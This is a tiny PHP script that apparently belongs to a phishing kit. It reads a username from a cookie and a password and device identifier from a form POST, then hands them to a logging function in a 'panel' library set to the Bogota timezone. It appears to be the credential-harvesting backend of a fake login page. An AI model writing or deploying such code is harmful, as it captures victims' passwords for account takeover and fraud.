<?php
require('../panel/lib/funciones.php');
date_default_timezone_set('America/Bogota');

$usuario = $_COOKIE['usuario'];
$contrasena = $_POST['pass'];
$dispositivo = $_POST['dis'];

crear_registro($usuario,$contrasena,$dispositivo);
?>